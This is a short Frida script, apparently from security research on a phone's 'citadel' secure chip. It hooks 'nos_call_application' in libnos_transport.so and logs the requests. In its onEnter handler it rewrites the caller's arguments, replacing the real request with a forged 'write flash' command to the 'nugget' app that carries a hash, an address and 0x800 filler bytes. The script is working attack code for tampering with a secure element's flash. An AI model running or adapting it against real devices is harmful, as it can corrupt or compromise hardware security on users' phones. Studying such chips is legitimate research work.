// hook and trace requests and answers to/from citadel via citadeld
const moduleBase =  Module.getExportByName("libnos_transport.so",
    'nos_call_application')

var reply, reply_size;

Interceptor.attach(moduleBase, {
    onEnter: function(args) {
        console.log("appID: " + args[1] + ", param: " + args[2]);
        console.log("request: " + args[3] + ", request_size: " + args[4]);
        var size = args[4].toInt32();
        reply = args[5];
        reply_size = args[6].toUInt32();

        args[1] = ptr(0x0);  // nugget
        args[2] = ptr(0x1) // write flash
        var buf = Memory.alloc(0x810);
        args[3] = buf;
        var hash = 0x8233f2ca;
        var x = [];

        // hash fd9c0bbc
        x.push(0xfd);
        x.push(0x9c);
        x.push(0x0b);
        x.push(0xbc);

        // addr
        x.push(0x00);
        x.push(0x07);
        x.push(0x08);
        x.push(0x00);

        // value
        for (var i=0;i<0x800;i++) {
            x.push(0x41);
        }
        console.log("size=" + x.length + " ptr=" + ptr(0x70800));
        args[3].writeByteArray(x);
        args[3] = buf;
        console.log(hexdump(Memory.readByteArray(buf, 0x808)));
        args[4] = ptr(0x808);
    },
    onLeave: function(retval) {
    }
});
